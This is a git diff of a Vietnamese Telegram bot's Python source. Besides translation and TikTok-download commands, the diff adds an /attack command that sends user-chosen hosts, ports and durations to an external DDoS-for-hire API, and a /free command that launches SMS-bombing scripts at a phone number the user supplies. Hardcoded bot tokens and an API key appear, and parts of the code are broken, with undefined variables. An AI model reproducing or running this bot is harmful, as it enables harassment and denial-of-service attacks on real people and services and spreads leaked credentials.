@@ -1,69 +1,37 @@
-import telegram 
-#code này để chạy bot thêm tính năng là chạy phà phà
-import telebot 
-import time
-import sys
-import subprocess
-import requests
-import random
-import os 
-import threading
-from datetime import datetime
-from pyotp import TOTP
-import psutil
-import hashlib
-import socket
-import zipfile
-import io
-import re
-import html
-import string
-import subprocess
-import sqlite3
+from keep_alive import keep_alive
+keep_alive()
+
 from gtts import gTTS
-import urllib3
-import json
-import wget
-from telebot import types
+from googletrans import Translator
+import telebot
+import datetime
+import time
+import os
+import subprocess
+import random
+import psutil
+import sqlite3
+import hashlib
+import requests
+import datetime
+import sys
+import pytube
+import socket
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, MessageHandler,CallbackQueryHandler
 import google.generativeai as genai
-urllib3.disable_warnings()
+import html
 
-bot_token = '7212380435:AAESyeHsC-IIm-63cgL82V2W-rAcd2K-rfc'# nhập token bot
-
+bot_token = '6838265816:AAFlzFcxH4RATMtDKftDwE656x5kg2trMDQ'
 bot = telebot.TeleBot(bot_token)
-
-
-
-
-# Khởi tạo một dictionary để lưu trữ các từ ngữ và câu trả lời tương ứng
-keywords = {}
-
-
-# Thời gian bot bắt đầu hoạt động
-start_time = time.time()
-
-# Biến toàn cục để lưu trữ tin nhắn sẽ được gửi tự động
-auto_message = ''
-
-filters = {}  # Lưu trữ bộ lọc
+translator = Translator()
 
 allowed_users = []
 processes = []
-admins = ["6895557861", "5789810284"] # Thay thế ADMIN_ID_1 và ADMIN_ID_2 bằng ID của các Admin
-proxy_update_count = 0
-last_proxy_update_time = time.time()
-key_dict = {}
-
-print("Bot Đã Được Khởi Chạy")
-print("Ower : @Louisvinh")
-print("LouisModTeam  - 𝗕𝗼𝘁⚡️")
+ADMIN_ID = '5789810284'
 
 connection = sqlite3.connect('user_data.db')
 cursor = connection.cursor()
-cooldown_dict = {}  # Thêm dòng này để khởi tạo cooldown_dict
-
-
-
 
 # Create the users table if it doesn't exist
 cursor.execute('''
@@ -73,89 +41,253 @@ cursor.execute('''
     )
 ''')
 connection.commit()
+
+
 def TimeStamp():
-    now = str(datetime.date.today())
-    return now
+  now = str(datetime.date.today())
+  return now
+
+
 def load_users_from_database():
-    cursor.execute('SELECT user_id, expiration_time FROM users')
-    rows = cursor.fetchall()
-    for row in rows:
-        user_id = row[0]
-        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
-        if expiration_time > datetime.datetime.now():
-            allowed_users.append(user_id)
+  cursor.execute('SELECT user_id, expiration_time FROM users')
+  rows = cursor.fetchall()
+  for row in rows:
+    user_id = row[0]
+    expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
+    if expiration_time > datetime.datetime.now():
+      allowed_users.append(user_id)
+
 
 def save_user_to_database(connection, user_id, expiration_time):
-    cursor = connection.cursor()
-    cursor.execute('''
+  cursor = connection.cursor()
+  cursor.execute(
+      '''
         INSERT OR REPLACE INTO users (user_id, expiration_time)
         VALUES (?, ?)
     ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
-    connection.commit()
+  connection.commit()
 
 
+print("✧══════ ༺༻ •══════✧\nThe bot has been started successfully\n Buy inbox bot @hadukiii\n✧══════ ༺༻ •══════✧")
+
+
+def add_user(message):
+  admin_id = message.from_user.id
+  if admin_id != ADMIN_ID:
+    bot.reply_to(message, 'BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY😾.')
+    return
+
+  if len(message.text.split()) == 1:
+    bot.reply_to(message, ' VUI LÒNG NHẬP ID NGƯỜI DÙNG ')
+    return
+
+  user_id = int(message.text.split()[1])
+  allowed_users.append(user_id)
+  expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
+  connection = sqlite3.connect('user_data.db')
+  save_user_to_database(connection, user_id, expiration_time)
+  connection.close()
+
+  bot.reply_to(
+      message,
+      f'🚀NGƯỜI DÙNG CÓ ID {user_id} ĐÃ ĐƯỢC THÊM VÀO DANH SÁCH ĐƯỢC PHÉP SỬ DỤNG LỆNH /supersms.🚀'
+  )
+
+
+load_users_from_database()
+
+
+@bot.message_handler(commands=['Vietnamese'])
+def send_welcome(message):
+    bot.reply_to(message, "Chào bạn! Hãy gửi một tin nhắn để tôi dịch nó sang tiếng Việt\n Ví dụ : /vn + Tiếng cần dịch.")
+
+@bot.message_handler(commands=['vn'])
+def translate_message(message):
+    text = message.text
+    translated_text = translator.translate(text, dest='vi').text
+    bot.reply_to(message, f"-> {translated_text}")
+    bot.reply_to(message, 'Language translation completed✅')
+
+@bot.message_handler(commands=['English'])
+def send_welcome(message):
+    bot.reply_to(message, "Chào bạn! Hãy gửi một tin nhắn để tôi dịch nó sang tiếng anh\n Ví dụ : /el + Tiếng cần dịch.")
+
+@bot.message_handler(commands=['el'])
+def translate_message(message):
+    text = message.text
+    translated_text = translator.translate(text, dest='en').text
+    bot.reply_to(message, f"-> {translated_text}")
+    bot.reply_to(message, 'Language translation completed✅')
+
+
+
+
+@bot.message_handler(commands=['check_website'])
+def check_website(message):
+    website_url = message.text.split()[1]
+    try:
+        response = requests.get(website_url)
+        if response.status_code == 200:
+            bot.reply_to(message, f"{website_url} is working fine!")
+        else:
+            bot.reply_to(message, f"{website_url} is not working, status code: {response.status_code}")
+    except Exception as e:
+        bot.reply_to(message, f"Error checking {website_url}: {str(e)}")
+
+@bot.message_handler(commands=['check_host'])
+def check_host(message):
+    host = message.text.split()[1]
+    try:
+        ip = socket.gethostbyname(host)
+        bot.reply_to(message, f"{host} is pointing to IP address: {ip}")
+    except Exception as e:
+        bot.reply_to(message, f"Error checking host: {str(e)}")
+        
+@bot.message_handler(commands=['free'])
+def lqm_sms(message):
+    user_id = message.from_user.id
+    if len(message.text.split()) == 1:
+        bot.reply_to(message, 'PLEASE ENTER PHONE NUMBER\nHOW TO USE:  /free + phone number\nFor example: /free 038xxxxxxx')
+        return
+
+    phone_number = message.text.split()[1]
+    if not phone_number.isnumeric():
+        bot.reply_to(message, 'INVALID PHONE NUMBER !')
+        return
+
+    if phone_number in ['113','911','114','115','+84328774559','0328774559']:
+        # Số điện thoại nằm trong danh sách cấm
+        bot.reply_to(message,"Bạn Làm Gì Thế Spam Cả Admin Lun Chớ")
+        return
+
+    file_path1 = os.path.join(os.getcwd(), "sms.py")
+    process = subprocess.Popen(["python", file_path, phone_number, "400"])    
+    process = subprocess.Popen(["python", file_path2, phone_number, "200"])
+    process = subprocess.Popen(["python", file_path3, phone_number, "300"])
+    process = subprocess.Popen(["python", file_path4, phone_number, "300"])
+    processes.append(process)
+    username = message.from_user.username
+
+    current_time = time.time()
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('free', 0) < 120:
+        remaining_time = int(120 - (current_time - cooldown_dict[username].get('free', 0)))
+        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /free.")
+        return
+    video_url = "liemspam.000webhostapp.com/lon.mp4"  # Replace this with the actual video URL      
+    message_text =f'Spam successful!!!\nAttack By: @{username} \nNumber of Attacks: {phone_number} \nJoin Kênh @LDV_LsTeam\n'
+    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
+
+  
 
 
 @bot.message_handler(commands=['start'])
-def diggory(message):
-    username = message.from_user.username
-    diggory_chat = f'''
-┌──────────⭓VIP @Louisvinh
-│» 🔔 Hello: @{username}
-│»  🐸 𝐵𝑜𝑡 𝐵𝑦 顶级开发商│ ᴍʀ 𝐕𝐋𝐒\n│»🛌 /admin : 𝐼𝑛𝑓𝑜 𝐴𝑑𝑚𝑖𝑛.\n│»👾 /spam : spam sms\n│»🥶 /tiktok : Download video tik\n│»💡 /ask : GPT AI Bot.\n│»🤖/time : check time\n│»🖥️/id : Scan Id\n│»🌐 Telegram : @Lousivinh
+def how_to(message):
+  how_to_text = '''
+ How to use and All Bot commands:
+┌──────────⭓
+│» /attack : Website Attack 
+│» /free : Spam sms, for example: /free 038xxxxxxx
+│» /check_website : Check Website. For example: /check_website + link
+│» /check_host : Check the website server. For example : /check_host + link
+│» /Vietnamese : Send all languages ​​and it will be translated into Vietnamese
+│» /English : Submitting all languages ​​will return English
+│» /tiktok : Download tiktok videos
+│» /ask : GPT BOT
+│» /id : check id you
+│» /check : /check + [link] check anti ddos
+│» /capcut : download video tiktok 
+│» /status.
+│» /stop: Stop all running tasks. (Only Administrators Can Use This Command).
+│» /restart: Restart the bot (Admin only).
+│» /admin: Display admin information.
 └─────────────────────
-    '''
-    sent_message = bot.send_message(message.chat.id, diggory_chat)
-
-    time.sleep(50)
+'''
+  bot.reply_to(message, how_to_text)
 
 
 
-@bot.message_handler(commands=['spam'])
-def spam(message):
-    user_id = message.from_user.id
-    if len(message.text.split()) == 1:
-        bot.reply_to(message, 'PLEASE ENTER THE PHONE NUMBER.')
-        return
-    if len(message.text.split()) == 2:
-        bot.reply_to(message, 'Please Enter Correct Format\n»For example: /spam 0987654321 500')
-        return
-    lap = message.text.split()[2]
-    if lap.isnumeric():
-      if not (int(lap) > 0 and int(lap) <= 100):
-        bot.reply_to(message,"Vui Lòng Spam Trong Khoảng 1 - 100 Thôi !!")
-        return
-    else:
-      bot.reply_to(message,"Sai Số Lần Spam !!!")
-      return
-    phone_number = message.text.split()[1]
-    if not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone_number):
-        bot.reply_to(message, 'SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !')
-        return
-
-    if phone_number in ["0365956335"]:
-        # Số điện thoại nằm trong danh sách cấm
-        bot.reply_to(message,"Spam cái đầu buồi tao huhu")
-        return
-    file_path = os.path.join(os.getcwd(), "sms.py")
-    process = subprocess.Popen(["python", file_path, phone_number, "100"])
-    processes.append(process)
-    bot.reply_to(message, f'➤ USER ID: [ {user_id} ]\n➤ Attack SĐT: [ {phone_number} ] Success ✅\n➤ Repeat  : {lap} ⏰\n➤ Day  : {TimeStamp()}\n')
-    
 
 
+@bot.message_handler(commands=['admin'])
+def how_to(message):
+  how_to_text = '''
+ Thông Tin Admin:
+✧══════ ༺༻ •══════✧
+- LE DUC VINH // LY QUANG VINH // VU HAI LAM
+🚀Thông Tin Liên Hệ ☎️:🚀
+- Owner Telegram: https://t.me/hadukiii
+- Ower helps : @kun_dzll
+- Facebook: https://facebook.com/ducvinhdll
+✧══════ ༺༻ •══════✧
+'''
+  bot.reply_to(message, how_to_text)
 
+@bot.message_handler(commands=['tiktok'])
+def luuvideo_tiktok(message):
+  if len(message.text.split()) == 1:
+    sent_message = bot.reply_to(message, 'Please enter link\nExample: /tiktok + (linkvideo)')
+    return
+  linktt = message.text.split()[1]
+  data = f'url={linktt}'
+  head = {
+    "Host":"www.tikwm.com",
+    "accept":"application/json, text/javascript, */*; q=0.01",
+    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
+    "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+  }
+  response = requests.post("https://www.tikwm.com/api/",data=data,headers=head).json()
+  linkz = response['data']['play']
+  rq = response['data']
+  tieude = rq['title']
+  view = rq['play_count']
+  sent_message = bot.reply_to(message, f'Please wait a moment..\n+ Title: {tieude}\n+ Number of views : {view}')
+  try:
+   bot.send_video(message.chat.id, video=linkz, caption=f'The video has been downloaded for you.\n│»Title: {tieude}\n│»Number of views: {view}', reply_to_message_id=message.message_id, supports_streaming=True)
+  except Exception as e:
+   bot.reply_to(message, f'Oh my God, Because the video is too heavy, you must download it using a link: {linkz}')
+  bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)  
+
+# Hàm tính thời gian hoạt động của bot
+start_time = time.time()
 @bot.message_handler(commands=['time'])
 def show_uptime(message):
-	
     current_time = time.time()
     uptime = current_time - start_time
     hours = int(uptime // 3600)
     minutes = int((uptime % 3600) // 60)
     seconds = int(uptime % 60)
-    uptime_str = f'```{hours} giờ, {minutes} phút, {seconds} giây```'
+    uptime_str = f'{hours} 𝐺𝑖𝑜̛̀, {minutes} 𝑃ℎ𝑢́𝑡, {seconds} 𝐺𝑖𝑎̂𝑦'
+    bot.reply_to(message, f'𝐵𝑜𝑡 𝐷𝑎̃ 𝐻𝑜𝑎̣𝑡 𝐷𝑜̣̂𝑛𝑔 𝐷𝑢̛𝑜̛̣𝑐: {uptime_str}')
     
-    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')
+
+
+@bot.message_handler(commands=['status'])
+def status(message):
+  user_id = message.from_user.id
+  process_count = len(processes)
+  bot.reply_to(message, f'Số quy trình đang xử lý {process_count}.')
+
+
+@bot.message_handler(commands=['restart'])
+def restart(message):
+  user_id = message.from_user.id
+  if user_id != ADMIN_ID:
+    bot.reply_to(message, 'Đã khởi động lại bot')
+    return
+
+  bot.reply_to(message, 'Bot sẽ được khởi động lại sau 3s')
+  time.sleep(2)
+  python = sys.executable
+  os.execl(python, python, *sys.argv)
+
+
+@bot.message_handler(commands=['stop'])
+def stop(message):
+  user_id = message.from_user.id
+  bot.reply_to(message, 'Đã dừng bot')
+  time.sleep(2)
+  bot.stop_polling()
+
 
 
 @bot.message_handler(commands=['ask'])
@@ -200,136 +332,84 @@ def gpt(message):
   response = model.generate_content(prompt_parts)
   end_time = time.time()
   response_time = end_time - start_time
-  bot.reply_to(message, f"●━━━━━━━━━━━━━━━●\n`{response.text}`\n●━━━━━━━━━━━━━━━●\n status time:{response_time}\n●━━━━━━━━━━━━━━━●", parse_mode="Markdown")
+  bot.reply_to(message, f"┌──────────⭓\n{response.text}\n└─────────────────────\n status time:{response_time}\n", parse_mode="Markdown")
+  
 
-@bot.message_handler(commands=['admin'])
-def diggory(message):
-    video = random.choice(["https://files.catbox.moe/8rflr1.mp4", "https://files.catbox.moe/pk5y20.mp4", "https://files.catbox.moe/s5xsi4.mp4", "https://files.catbox.moe/ioafmk.mp4"])
-    username = message.from_user.username
-    diggory_chat = f'''
-┌─────⭓ DEV ᴍʀ 𝐕𝐋𝐒ㅤ🧿 | BOT
-│»  🔔 Xin Chào: @{username}
-│»  🌐 Zalo: xxxx
-│»  🌐 Telegram : @Louisvinh
-└─────────────────────
-    '''
-    sent_message = bot.send_message(message.chat.id, diggory_chat)
 
-    time.sleep(20)
-
-#Tỉa soud
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = message.from_user.id
     bot.reply_to(message, f"📄 • User ID : {user_id}")
 
-@bot.message_handler(commands=['tiktok'])
-def luuvideo_tiktok(message):
-  if len(message.text.split()) == 1:
-    sent_message = bot.reply_to(message, 'Please enter the tiktok video.\n For example: /tiktok https://tiktok.com/mau')
-    return
-  linktt = message.text.split()[1]
-  data = f'url={linktt}'
-  head = {
-    "Host":"www.tikwm.com",
-    "accept":"application/json, text/javascript, */*; q=0.01",
-    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
-    "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
-  }
-  response = requests.post("https://www.tikwm.com/api/",data=data,headers=head).json()
-  linkz = response['data']['play']
-  rq = response['data']
-  tieude = rq['title']
-  view = rq['play_count']
-  sent_message = bot.reply_to(message, f'Please wait a moment..\n»Title: {tieude}\n»Video views: {view}')
-  try:
-   bot.send_video(message.chat.id, video=linkz, caption=f'Video downloaded successfully, thank you for using me\n»Title: {tieude}\n»Video View: {view}\n»Creator: t.me/Louisvinh', reply_to_message_id=message.message_id, supports_streaming=True)
-  except Exception as e:
-   bot.reply_to(message, f'The Video Is Too Heavy So You Can Download It Yourself Using The Link:\n{linkz}')
-  bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)  
-  
 
 
-def is_user_admin(chat_id, user_id):
-    """Kiểm tra xem người dùng có phải là admin của chat (nhóm) không."""
-    admin_list = bot.get_chat_administrators(chat_id)
-    for admin in admin_list:
-        if admin.user.id == user_id:
-            return True
-    return False
+
+@bot.message_handler(commands=['capcut']) 
+def handle_capcut(message): 
+    try: 
+        url = message.text.split()[1]  # Lấy URL từ lệnh capcut 
+        api_url = f"https://sumiproject.io.vn/capcutdowload?url={url}" 
+        response = requests.get(api_url) 
+ 
+        if response.status_code == 200: 
+            data = response.json() 
+            title = data.get("title", "N/A") 
+            description = data.get("description", "N/A") 
+            usage = data.get("usage", "N/A") 
+            video_url = data.get("video") 
+ 
+            if video_url: 
+                bot.send_message(message.chat.id, f"Mô Tả: {title}\nDescription: {description}\nLượt dùng: {usage}") 
+                bot.send_video(message.chat.id, video_url) 
+            else: 
+                bot.reply_to(message, "Không tìm thấy URL video trong dữ liệu API.") 
+        else: 
+            bot.reply_to(message, "Không thể kết nối đến API. Vui lòng thử lại sau.") 
+ 
+    except IndexError: 
+        bot.reply_to(message, "Vui lòng cung cấp URL sau lệnh capcut.")
 
 
-@bot.message_handler(commands=['filters'])
-def list_filters(message):
-    chat_id = message.chat.id
+
+@bot.message_handler(commands=['attack'])
+def attack_command(message):
     user_id = message.from_user.id
     
-    # Chỉ cho phép admin xem bộ lọc
-    if not is_user_admin(chat_id, user_id):
-        bot.reply_to(message, "Xin lỗi, chỉ có admin mới có thể xem danh sách bộ lọc.")
-        return
-    
-    if filters:
-        filter_list = ', '.join(filters.keys())
-        bot.reply_to(message, f"Danh sách bộ lọc hiện tại: {filter_list}")
-    else:
-        bot.reply_to(message, "Không có bộ lọc nào được cài đặt.")
-
-# Các hàm xử lý khác đã được thêm vào từ các ví dụ trước...
-
-
-
-@bot.message_handler(commands=['filter'])
-def add_filter(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    
-    # Chỉ cho phép admin thêm bộ lọc
-    if not is_user_admin(chat_id, user_id):
-        bot.reply_to(message, "Xin lỗi, bạn cần phải là admin để sử dụng lệnh này.")
-        return
-    
-    parts = message.text.split(maxsplit=1)
-    if len(parts) != 2:
-        bot.reply_to(message, "Bạn cần chỉ định tên bộ lọc. Ví dụ: /filter vinh")
-        return
-    
-    filter_name = parts[1].strip().lower()  # Để tránh phân biệt chữ hoa chữ thường
-    filters[filter_name] = message.reply_to_message.text if message.reply_to_message else "Bộ lọc này không có nội dung mặc định."
-    bot.reply_to(message, f"Đã thêm bộ lọc cho từ khóa: '{filter_name}'")
-
-
-@bot.message_handler(commands=['stop'])
-def remove_filter(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    
-    # Chỉ cho phép admin xóa bộ lọc
-    if not is_user_admin(chat_id, user_id):
-        bot.reply_to(message, "Xin lỗi, chỉ có admin mới có thể thực hiện hành động này.")
-        return
-    
-    parts = message.text.split(maxsplit=1)
-    if len(parts) != 2:
-        bot.reply_to(message, "Bạn cần chỉ định tên bộ lọc cần xóa. Ví dụ: /stop <từ khóa>")
-        return
-    
-    filter_name = parts[1].strip().lower()
-    
-    if filter_name in filters:
-        del filters[filter_name]
-        bot.reply_to(message, f"Bộ lọc cho từ khóa '{filter_name}' đã được xóa.")
-    else:
-        bot.reply_to(message, f"Không tìm thấy bộ lọc cho từ khóa: '{filter_name}'")
         
+    if len(message.text.split()) < 5:
+        bot.reply_to(message, ' 𝑷𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝑪𝒐𝒓𝒓𝒆𝒄𝒕 𝑺𝒚𝒏𝒕𝒂𝒙.\n𝑭𝒐𝒓 𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : /attack + [𝒉𝒐𝒔𝒕] + [𝒑𝒐𝒓𝒕] + [𝒕𝒊𝒎𝒆] + [𝒎𝒆𝒕𝒉𝒐𝒅𝒔]\nCurrent Methods:\n FLOOD')
+        return
 
-@bot.message_handler(func=lambda message: True)
-def filter_message(message):
-    for filter_name in filters:
-        if filter_name in message.text.lower():
-            bot.reply_to(message, filters[filter_name])
-            break
-   
+    username = message.from_user.username
+
+    args = message.text.split()
+    host = args[1]
+    port = args[2]
+    time = args[3]
+    method = args[4]
+
+    if int(time) > 61:
+        bot.reply_to(message, '𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝑪𝒂𝒏𝒏𝒐𝒕 𝑬𝒙𝒄𝒆𝒆𝒅 𝟔𝟎 𝑺𝒆𝒄𝒐𝒏𝒅𝒔.')
+        return
+
+    username = message.from_user.username
+
+    bot.reply_to(message, f'𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐚𝐩𝐢 𝐬𝐞𝐫𝐯𝐞𝐫 𝐟𝐚𝐢𝐥𝐞𝐝')
+
+    args = message.text.split()
+    host = args[1]
+    port = args[2]
+    time = args[3]
+    method = args[4]
+    
+    # Gửi dữ liệu tới api
+    api = f"https://kha.bartrickc2.ovh/api/attack?host=[host]&port=[port]&time=[time]&method={method}&key=dvinkls&username=ducvinhlord"
+    response = requests.get(api)
+    print("\n", response.text, "\n")
+
+    bot.reply_to(message, f'Attack Target Successfully\n┣➤ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 : @{username}\n┣➤ 𝐓𝐚𝐫𝐠𝐞𝐭 : {host}\n┣➤ 𝐏𝐨𝐫𝐭 : {port}\n┣➤ 𝐓𝐢𝐦𝐞 : {time}\n┣➤ 𝐌𝐞𝐭𝐡𝐨𝐝 : {method}')
+    
 
 
-    bot.infinity_polling(timeout=60, long_polling_timeout = 1)
+    
+bot.infinity_polling(timeout=60, long_polling_timeout = 1)
